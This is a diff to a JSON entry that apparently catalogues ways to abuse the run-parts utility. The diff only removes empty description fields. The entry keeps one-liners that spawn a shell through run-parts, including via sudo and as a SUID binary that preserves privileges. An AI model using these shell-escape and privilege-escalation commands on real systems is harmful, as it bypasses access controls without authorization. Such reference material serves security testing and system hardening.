@@ -2,19 +2,19 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "run-parts --new-session --regex '^sh$' /bin\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo run-parts --new-session --regex '^sh$' /bin\n"
       }
     ],
     "suid": [
       {
-        "description": "",
+        
         "code": "./run-parts --new-session --regex '^sh$' /bin --arg='-p'\n"
       }
     ]
